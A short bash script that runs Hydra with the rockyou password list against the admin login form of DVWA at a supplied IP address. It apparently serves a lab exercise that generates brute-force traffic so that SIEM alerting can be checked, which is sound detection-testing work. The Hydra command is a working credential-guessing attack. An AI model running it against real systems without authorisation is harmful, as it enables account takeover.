
#!/bin/bash
# Brute Force Simulation using Hydra
# Usage: ./bruteforce_test.sh <target-ip>

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: ./bruteforce_test.sh <target-ip>"
  exit 1
fi

echo "[*] Starting Brute Force on $TARGET"

hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  $TARGET http-post-form \
  "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -V -f

echo "[+] Done. Check SIEM for brute force alerts."

